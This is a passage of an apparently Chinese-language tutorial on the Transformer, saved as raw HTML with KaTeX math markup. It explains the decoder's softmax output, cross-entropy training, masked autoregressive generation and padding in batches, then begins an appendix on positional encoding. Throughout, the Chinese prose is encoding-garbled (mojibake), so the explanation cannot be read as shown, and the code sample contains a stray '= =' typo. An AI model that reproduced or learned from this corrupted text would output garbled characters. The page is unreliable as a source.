xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span></span>ï¼Œå¾—åˆ°çŸ©é˜µ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Z</mi></mrow><annotation encoding="application/x-tex">Z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span></span></span></span></span>ã€‚æ¥ç€ï¼Œå¯¹ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Z</mi></mrow><annotation encoding="application/x-tex">Z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span></span></span></span></span> çš„æ¯ä¸€è¡Œåº”ç”¨ softmax å‡½æ•°ï¼Œå°†å…¶è½¬æ¢ä¸ºä¸€ä¸ªæ¦‚ç‡åˆ†å¸ƒçŸ©é˜µ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></span>ï¼š</p>
<p>å…¶ä¸­ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>P</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi></mrow></msub></mrow><annotation encoding="application/x-tex">P_{i,j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span> è¡¨ç¤ºç¬¬ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"/><span class="mord mathnormal">i</span></span></span></span></span> ä¸ªæ—¶é—´æ­¥ï¼ˆå¯¹åº”ç›®æ ‡åºåˆ—ç¬¬ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"/><span class="mord mathnormal">i</span></span></span></span></span> ä¸ªä½ç½®ï¼‰ç”Ÿæˆè¯è¡¨ä¸­ç¬¬ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span></span> ä¸ªè¯çš„æ¦‚ç‡ã€‚æœ€ç»ˆ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></span> çš„æ¯ä¸€è¡Œéƒ½æ˜¯ä¸€ä¸ªåœ¨è¯è¡¨ä¸Šçš„æ¦‚ç‡åˆ†å¸ƒï¼Œä¾‹å¦‚ç¬¬ä¸€è¡Œå¯¹åº”ä» <code>&lt;sos&gt;</code> ä¹‹åç”Ÿæˆç¬¬ä¸€ä¸ªè¯çš„æ¦‚ç‡åˆ†å¸ƒï¼Œç¬¬äºŒè¡Œå¯¹åº”ç”Ÿæˆç¬¬äºŒä¸ªè¯çš„æ¦‚ç‡åˆ†å¸ƒï¼Œä¾æ­¤ç±»æ¨ã€‚</p>
<p>åœ¨è®­ç»ƒæ—¶ï¼Œæˆ‘ä»¬ä½¿ç”¨äº¤å‰ç†µæŸå¤±å‡½æ•°æ¯”è¾ƒ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></span> ä¸çœŸå®ç›®æ ‡åºåˆ—çš„ one-hot æ ‡ç­¾ï¼Œå…·ä½“è€Œè¨€ï¼Œå¯¹äºç›®æ ‡åºåˆ— <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>X</mi><mrow><mi>t</mi><mi>g</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">X_{tgt}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>=<code>[I,like,deep,learning,&lt;eos&gt;]</code>ï¼Œæˆ‘ä»¬å°†å…¶è½¬åŒ–ä¸º one-hot å‘é‡å½¢å¼ã€‚ç”±äºè‹±æ–‡è¯è¡¨å¤§å°ä¸º<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span></span>ï¼Œåˆ™æ¯ä¸ªå•è¯å¯¹åº”ä¸€ä¸ª<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span></span>ç»´çš„ one-hot å‘é‡ï¼Œå…¶ä¸­å¯¹åº”å•è¯ç´¢å¼•çš„ä½ç½®ä¸º 1ï¼Œå…¶ä½™ä¸º 0ã€‚</p>
<p>ä¸è¦å¿˜äº†ï¼Œè§£ç å™¨æ˜¯å¸¦æœ‰æ©ç çš„ï¼Œå› æ­¤åºåˆ—ä¸­çš„æ¯ä¸ªå­åºåˆ—éƒ½æ˜¯çœ‹ä¸åˆ°å®ƒçš„ä¸‹ä¸€ä¸ªè¯çš„ï¼Œä½†æ˜¯èƒ½çœ‹åˆ°å®ƒå‰é¢çš„æ‰€æœ‰è¯ã€‚æ­£æ˜¯å› ä¸ºå¦‚æ­¤ï¼Œå®ƒæ‰èƒ½è¿™æ ·è¿›è¡Œè®­ç»ƒã€‚</p>
<p>è¿™å…¶å®ä¹Ÿå°±æ˜¯æ„å‘³ç€ï¼Œå¦‚æœæœªæ¥åœ¨ç¼–ç å™¨è¾“å…¥â€œæˆ‘å–œæ¬¢æ·±åº¦å­¦ä¹ â€çš„æƒ…å†µä¸‹ï¼Œæˆ‘åœ¨è§£ç å™¨è¾“å…¥<code>[&lt;sos&gt;]</code>ï¼Œæˆ‘æœŸæœ›å®ƒè¾“å‡º<code>[I]</code>çš„æ¦‚ç‡æœ€å¤§ï¼›åœ¨è§£ç å™¨è¾“å…¥<code>[&lt;sos&gt;ï¼ŒI]</code>ï¼Œæˆ‘æœŸæœ›å®ƒè¾“å‡º<code>[Iï¼Œlike]</code>ï¼›åœ¨è§£ç å™¨è¾“å…¥<code>[&lt;sos&gt;ï¼ŒIï¼Œlike]</code>ï¼Œæˆ‘æœŸæœ›å®ƒè¾“å‡º<code>[Iï¼Œlikeï¼Œdeep]</code>ï¼›åœ¨è§£ç å™¨è¾“å…¥<code>[&lt;sos&gt;ï¼ŒIï¼Œlikeï¼Œdeep]</code>ï¼Œæˆ‘æœŸæœ›å®ƒè¾“å‡º<code>[Iï¼Œlikeï¼Œdeepï¼Œlearning]</code>ï¼›åœ¨è§£ç å™¨è¾“å…¥<code>[&lt;sos&gt;ï¼ŒIï¼Œlikeï¼Œdeepï¼Œlearning]</code>ï¼Œæˆ‘æœŸæœ›å®ƒè¾“å‡º<code>[Iï¼Œlikeï¼Œdeepï¼Œlearningï¼Œ&lt;eos&gt;]</code>ï¼Œæœ€ååœ¨é‡è§<code>&lt;eos&gt;</code>æˆ–è€…è¾“å‡ºé•¿åº¦åˆ°è¾¾é¢„è®¾ä¸Šé™æ—¶å°±åœæ­¢è¾“å…¥ï¼Œå®Œæˆç”Ÿæˆã€‚</p>
<p>é€šå¸¸åœ¨æ¨ç†ä¸­ï¼Œé‡‡ç”¨è‡ªå›å½’çš„æ–¹å¼ç”Ÿæˆåºåˆ—ï¼Œæˆ‘ä»¬åªå–è¾“å‡ºåºåˆ—çš„æœ€åä¸€ä¸ªä½ç½®çš„è¾“å‡ºï¼ˆä»…å…³æ³¨æœ€æ–°ä¸€æ­¥çš„é¢„æµ‹ç»“æœï¼‰ï¼Œå°†å…¶åŠ å…¥åˆ°è¾“å…¥åºåˆ—çš„æœ«å°¾å†æ¬¡è¿›è¡Œè¾“å…¥(å°±åƒä¸Šé¢æ¼”ç¤ºçš„é‚£æ ·)ã€‚ä½†æ˜¯ï¼Œè¿™ç§é€è¯ç”Ÿæˆçš„æ–¹å¼åœ¨é•¿åºåˆ—ä»»åŠ¡ä¸­ä¼šå¯¼è‡´æ•ˆç‡é—®é¢˜ï¼Œå› ä¸ºæ¯ä¸€æ­¥éƒ½éœ€è¦é‡æ–°è®¡ç®—æ•´ä¸ªåºåˆ—çš„è¡¨ç¤ºã€‚ä¸è¿‡ç›®å‰å·²æœ‰è®¸å¤šä¼˜åŒ–æ–¹æ³•ï¼Œä½†è¿™å·²è¶…å‡ºæœ¬ç¯‡åŸºç¡€æŒ‡å—çš„èŒƒç•´ã€‚å°±ä¸è¿‡å¤šä»‹ç»äº†ã€‚</p>
<blockquote>
<p><strong>é¢˜å¤–è¯ï¼š</strong></p>
<p>ä¸Šé¢çš„ä¾‹å­æ˜¯ä½¿ç”¨å•ä¸€æ ·æœ¬è¿›è¡Œè®­ç»ƒçš„ï¼Œè€Œåœ¨å®é™…è®­ç»ƒä¸­ï¼Œä¸ºäº†æé«˜ç¡¬ä»¶åˆ©ç”¨ç‡å’Œè®­ç»ƒç¨³å®šæ€§ï¼Œæˆ‘ä»¬é€šå¸¸ä¼šé‡‡ç”¨<strong>æ‰¹æ¬¡è®­ç»ƒ</strong>ï¼ˆBatchï¼‰ã€‚æ­¤æ—¶ï¼Œè¾“å…¥çš„å¼ é‡å½¢çŠ¶å°†å˜ä¸º <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>b</mi><mi>a</mi><mi>t</mi><mi>c</mi><mi>h</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo separator="true">,</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mtext>ï¼Ÿ</mtext><mo separator="true">,</mo><mi>e</mi><mi>m</mi><mi>b</mi><mi>e</mi><mi>d</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(batch\_size, seq\_lenï¼Ÿ, embed\_size)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"/><span class="mopen">(</span><span class="mord mathnormal">ba</span><span class="mord mathnormal">t</span><span class="mord mathnormal">c</span><span class="mord mathnormal">h</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord cjk_fallback">ï¼Ÿ</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">e</span><span class="mord mathnormal">mb</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mclose">)</span></span></span></span></span>ã€‚</p>
<p>ä½†è¿™é‡Œå­˜åœ¨ä¸€ä¸ªç°å®é—®é¢˜ï¼Œå°±æ˜¯åŒä¸€ä¸ªæ‰¹æ¬¡ä¸­çš„å¥å­é•¿åº¦å¾€å¾€å„ä¸ç›¸åŒã€‚æ— æ³•ç›´æ¥ç»„åˆæˆä¸€ä¸ªå¼ é‡ï¼Œå› æ­¤ä¹Ÿå°±æ— æ³•è¾“å…¥åˆ°Transformerä¸­è¿›è¡Œè®­ç»ƒã€‚</p>
<p>å¸¸ç”¨çš„è§£å†³æ–¹æ³•å°±æ˜¯å¼•å…¥å¡«å……æœºåˆ¶ï¼Œå³åœ¨è¾ƒçŸ­åºåˆ—çš„æœ«å°¾æ·»åŠ ç‰¹æ®Šçš„å¡«å……ç¬¦å·ï¼ˆå¦‚<code>&lt;pad&gt;</code>ï¼‰ï¼Œä½¿è¯¥æ‰¹æ¬¡ä¸­æ‰€æœ‰åºåˆ—é•¿åº¦ä¸€è‡´ã€‚ç„¶ååœ¨æ¨¡å‹ä¸­æ·»åŠ æ©ç æ¥å±è”½å¡«å……ä½ç½®çš„å½±å“ï¼Œå…·ä½“æ¥è¯´å°±æ˜¯åœ¨æ³¨æ„åŠ›æœºåˆ¶ä¸­ï¼Œå°†å¡«å……ä½ç½®å¯¹åº”çš„æ³¨æ„åŠ›æƒé‡è®¾ç½®ä¸ºä¸€ä¸ªæå°çš„å€¼ï¼ˆå¦‚ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>âˆ’</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup></mrow><annotation encoding="application/x-tex">-10^9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"/><span class="mord">âˆ’</span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span></span></span></span></span>ï¼‰ï¼Œä½¿å¾—åœ¨ softmax ä¹‹åè¿™äº›ä½ç½®çš„æƒé‡æ¥è¿‘ 0ã€‚æ›´åŠ å…·ä½“çš„æ“ä½œæ–¹å¼å°±ä¸åœ¨è¿™é‡Œè®²è§£äº†ï¼Œæ„Ÿå…´è¶£çš„æœ‹å‹å¯ä»¥è‡ªå·±å»æœç´¢èµ„æ–™äº†è§£å­¦ä¹ ã€‚</p>
</blockquote>
<p>ä¸çŸ¥ä½ æ˜¯å¦æ³¨æ„åˆ°ï¼ŒTransformer è¿™ç§é€è¯ç”Ÿæˆæ¨¡å¼ï¼Œä¸å¦‚ä»Šå¯¹è¯å¼å¤§è¯­è¨€æ¨¡å‹çš„å“åº”æ–¹å¼å¦‚å‡ºä¸€è¾™â€”â€”æ˜¯çš„ï¼Œè¿™æ­£æ˜¯å› ä¸º <strong>GPT ç³»åˆ—æ¨¡å‹æœ¬è´¨ä¸Šå°±æ˜¯ç”± Transformer çš„è§£ç å™¨éƒ¨åˆ†æ¼”å˜è€Œæ¥</strong>ã€‚ä»…ä½¿ç”¨ç¼–ç å™¨éƒ¨åˆ†ï¼Œåˆ™æ„æˆäº†å¦ä¸€é‡Œç¨‹ç¢‘æ¨¡å‹ <strong>BERT</strong> çš„æ ¸å¿ƒæ¶æ„ã€‚åˆ°è¿™é‡Œï¼Œä½ å·²ç»ç¦»å½“ä»Šçš„å¤§è¯­è¨€æ¨¡å‹çš„æœ¬è´¨åˆæ›´è¿›ä¸€æ­¥ï¼</p>
<p>è‡³æ­¤ï¼Œä½ å·²ç»æŒæ¡äº† Transformer çš„æ ¸å¿ƒæ¶æ„ä¸è¿è¡Œé€»è¾‘ã€‚é‚£ä¹ˆï¼Œåœ¨ä½ æœªæ¥çš„å®é™…é¡¹ç›®ä¸­ï¼Œæ˜¯å¦æ¯æ¬¡éƒ½éœ€è¦â€œå…¨ç›˜ç…§æ¬â€æ•´ä¸ªTransformerç»“æ„å‘¢ï¼Ÿ<strong>æˆ‘è§‰å¾—å¹¶ä¸éœ€è¦</strong>ã€‚Transformer çš„å¼ºå¤§ä¹‹å¤„æ°æ°åœ¨äºå…¶<strong>æ¨¡å—åŒ–è®¾è®¡</strong>ï¼šä½ å¯ä»¥æ ¹æ®ä»»åŠ¡éœ€è¦ï¼Œçµæ´»é€‰å–å…¶ä¸­çš„è‡ªæ³¨æ„åŠ›å±‚ã€äº¤å‰æ³¨æ„åŠ›å±‚ã€ä½ç½®ç¼–ç ç­‰ç»„ä»¶ï¼Œç”šè‡³å¯¹å®ƒä»¬è¿›è¡Œæ”¹é€ æˆ–é‡ç»„ï¼Œåæ­£ä½ éƒ½å·²ç»äº†è§£å®ƒçš„åŸç†äº†ï¼Œæ‹†å¼€é‡æ„ä¹Ÿä¸æ˜¯ä»€ä¹ˆéš¾äº‹ã€‚</p>
<p>è¿™ç§â€œæ‹†è§£-é‡ç»„-åˆ›æ–°â€çš„æ€ç»´ï¼Œæ­£æ˜¯æ·±åº¦å­¦ä¹ æ¨¡å‹æ¼”è¿›ä¸­çš„å¸¸è§è·¯å¾„ã€‚å…¶å®åˆ°è¿™é‡Œï¼Œä½ ä¼šå‘ç°ï¼Œé‚£äº›ä»¤äººç”Ÿç•çš„å‰æ²¿ç½‘ç»œæ¶æ„ï¼Œå…¶å®å¤§å¤šæ˜¯ç”±æˆ‘ä»¬ç†Ÿæ‚‰çš„åŸºæœ¬æ¨¡å—â€”â€”å¦‚ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>Softmax</mtext></mrow><annotation encoding="application/x-tex">\text{Softmax}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord text"><span class="mord">Softmax</span></span></span></span></span></span>ã€<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>Linear</mtext></mrow><annotation encoding="application/x-tex">\text{Linear}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord text"><span class="mord">Linear</span></span></span></span></span></span>ã€<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>LayerNorm</mtext></mrow><annotation encoding="application/x-tex">\text{LayerNorm}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"/><span class="mord text"><span class="mord">LayerNorm</span></span></span></span></span></span>ã€æ®‹å·®è¿æ¥ï¼ŒCNNç­‰â€”â€”é€šè¿‡å·§å¦™çš„æ’åˆ—ç»„åˆè€Œæ¥ã€‚ä¾‹å¦‚ï¼Œå°† Transformer çš„è‡ªæ³¨æ„åŠ›ä¸å·ç§¯æ¨¡å—ç»“åˆï¼Œä¾¿å‚¬ç”Ÿäº† <strong>ConvTransformer</strong>ï¼›åœ¨è§†è§‰ä»»åŠ¡ä¸­ä»…ä½¿ç”¨ç¼–ç å™¨å¹¶è°ƒæ•´æ³¨æ„åŠ›æœºåˆ¶ï¼Œå°±è¯ç”Ÿäº† <strong>Vision Transformer (ViT)</strong>ã€‚æœ‰æ—¶å€™ï¼Œä»…ä»…æ˜¯ä¸¤ä¸ªå·²æœ‰ç»“æ„çš„æœ‰æœºèåˆï¼Œå°±èƒ½åœ¨ç‰¹å®šä»»åŠ¡ä¸Šå–å¾—çªç ´ï¼Œè¿™æœ¬èº«å°±æ˜¯ä¸€ä¸ªé‡è¦çš„åˆ›æ–°æ–¹å‘ã€‚</p>
<p><strong>çœŸæ­£çš„å­¦ä¹ ï¼Œå§‹äºç†è§£ï¼Œæˆäºé‡æ„ï¼Œæœ€ç»ˆæŠµè¾¾åˆ›æ–°</strong>ã€‚ä¸å¦¨ä»ä¸€ä¸ªå°å®éªŒå¼€å§‹ã€‚ç†è®ºä¸å®è·µçš„äº¤æ±‡å¤„ï¼Œæ­£æ˜¯çµæ„Ÿè¿¸å‘çš„åœ°æ–¹ã€‚æœªæ¥æˆ–è®¸æœ‰ä¸€å¤©ï¼Œä½ ä¼šç«™åœ¨è¿™äº›åŸºç¡€æ¨¡å—ä¹‹ä¸Šï¼Œæ­å»ºå‡ºå±äºè‡ªå·±ã€ç”šè‡³å½±å“æŸä¸ªé¢†åŸŸçš„æ–°æ¶æ„ã€‚æœŸå¾…ä½ åœ¨ç†è§£ Transformer ä¹‹åï¼Œä¸ä»…èƒ½å¤ç°å®ƒï¼Œæ›´èƒ½æ‹†è§£å®ƒã€æ”¹è¿›å®ƒï¼Œæœ€ç»ˆè¶…è¶Šå®ƒã€‚æ·±åº¦å­¦ä¹ çš„ä¸–ç•Œé‡Œï¼Œæ²¡æœ‰ç»ˆæçš„æ¨¡å‹ï¼Œåªæœ‰ä¸æ–­æ¼”è¿›çš„æ€æƒ³â€”â€”è€Œè¯»åˆ°è¿™é‡Œçš„ä½ ï¼Œå·²ç»èµ°åœ¨äº†è¿™æ¡è·¯ä¸Šã€‚</p>
<h3 data-id="heading-1">é™„å½•1ï¼šä½ç½®ç¼–ç </h3>
<p>å¦‚ä¸Šæ–‡æ‰€è¿°ï¼Œè‡ªæ³¨æ„åŠ›æœºåˆ¶èƒ½å¤Ÿå‡ºè‰²åœ°æ•æ‰åºåˆ—å…ƒç´ ä¹‹é—´çš„ç›¸å…³æ€§ï¼Œä½†å…¶è®¡ç®—è¿‡ç¨‹æœ¬è´¨ä¸Šæ˜¯<strong>æ— åºçš„</strong>â€”â€”å®ƒæ— æ³•åŒºåˆ†â€œæˆ‘çˆ±è‡ªç„¶è¯­è¨€å¤„ç†â€ä¸â€œè‡ªç„¶è¯­è¨€å¤„ç†çˆ±æˆ‘â€ä¹‹é—´çš„é¡ºåºå·®å¼‚ã€‚ä¸ºäº†å¼¥è¡¥è¿™ä¸€å…³é”®ç¼ºé™·ï¼Œæˆ‘ä»¬éœ€è¦ä¸ºæ¨¡å‹å¼•å…¥<strong>ä½ç½®ä¿¡æ¯</strong>ã€‚</p>
<p>ä½ç½®ç¼–ç çš„æ ¸å¿ƒæ€æƒ³éå¸¸ç›´è§‚ï¼šä¸ºåºåˆ—ä¸­æ¯ä¸ªä½ç½®çš„è¯å‘é‡æ·»åŠ ä¸€ä¸ªç‹¬ç‰¹çš„â€œä½ç½®æ ‡è®°â€ã€‚è¿™ä¸ªæ ‡è®°æ˜¯ä¸€ä¸ªä¸è¯å‘é‡ç»´åº¦ç›¸åŒçš„å‘é‡ï¼Œæœ€ç»ˆé€šè¿‡<strong>ç›¸åŠ </strong>çš„æ–¹å¼ä¸åŸå§‹è¯å‘é‡èåˆï¼Œä»è€Œè®©æ¯ä¸ªè¾“å…¥éƒ½â€œè®°ä½â€è‡ªå·±åœ¨åºåˆ—ä¸­çš„ä½ç½®ã€‚</p>
<p>ä¸€ä¸ªæœ€ç›´è§‚çš„æ–¹æ¡ˆï¼šç”¨äºŒè¿›åˆ¶æˆ–è‡ªç„¶æ•°çš„ç‹¬çƒ­ç¼–ç æ¥è¡¨ç¤ºä½ç½®ã€‚ä¾‹å¦‚ï¼Œå¯¹äºä¸€ä¸ªä¸‰ç»´å‘é‡ï¼Œå¯ä»¥è¿™æ ·è®¾è®¡ä½ç½®ç¼–ç ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># åŸå§‹è¾“å…¥åºåˆ— (ä¾‹å¦‚3ä¸ªè¯ï¼Œæ¯ä¸ªè¯ç”¨3ç»´å‘é‡è¡¨ç¤º)</span>
X = [[<span class="hljs-number">1.34</span>, <span class="hljs-number">2.83</span>, <span class="hljs-number">0.51</span>],
     [<span class="hljs-number">4.12</span>, <span class="hljs-number">5.10</span>, <span class="hljs-number">3.11</span>],
     [<span class="hljs-number">0.41</span>, <span class="hljs-number">3.71</span>, <span class="hljs-number">1.33</span>]]

<span class="hljs-comment"># ä¸€ç§ç®€å•çš„ä½ç½®ç¼–ç ï¼ˆæ­¤å¤„ä»…ä¸ºç¤ºæ„ï¼Œå¹¶éTransformerå®é™…æ‰€ç”¨ï¼‰</span>
P_simple = [[<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>],  <span class="hljs-comment"># ä½ç½®0</span>
            [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>],  <span class="hljs-comment"># ä½ç½®1</span>
            [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>]]  <span class="hljs-comment"># ä½ç½®2</span>

<span class="hljs-comment"># èåˆäº†ä½ç½®ä¿¡æ¯çš„æœ€ç»ˆè¾“å…¥</span>
X_input = X + P_simple = = [[<span class="hljs-number">1.34</span>, <span class="hljs-number">2.83</span>, <span class="hljs-number">1.51</span>],
     						[<span class="hljs-number">4.12</span>, <span class="hljs-number">6.10</span>, <span class="hljs-number">3.11</span>],
     						[<span class="hljs-number">0.41</span>, <span class="hljs-number">4.71</span>, <span class="hljs-number">2.33</span>]]
</code></pre>
<p>å¯¹ï¼Œå°±æ˜¯è¿™ä¹ˆç®€å•ç²—æš´ï¼Œåªä¸è¿‡ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¸ç”¨äºŒè¿›åˆ¶é€’å¢åºåˆ—æ¥è¡¨ç¤ºä½ç½®ç¼–ç å‘é‡ï¼Œè€Œæ˜¯ç”¨æ­£ä½™å¼¦ä½ç½®ç¼–ç åºåˆ—æ¥è¡¨ç¤ºï¼ˆåŸè®ºæ–‡ä¸­çš„æ–¹æ³•ï¼‰ã€‚ä½†å…¶æœ¬è´¨éƒ½æ˜¯ä¸€æ ·çš„ã€‚</p>
<p>å¯¹ç…§ä¸Šè¿°çš„ä¾‹å­ï¼Œæ­£ä½™å¼¦ä½ç½®ç¼–ç çŸ©é˜µå¦‚ä¸‹æ‰€ç¤º</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>P</mi><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>f</mi><mn>0</mn></msub><mo stretchy="false">(</mo><mn>0</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>f</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mn>0</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>f</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mn>0</mn><mo 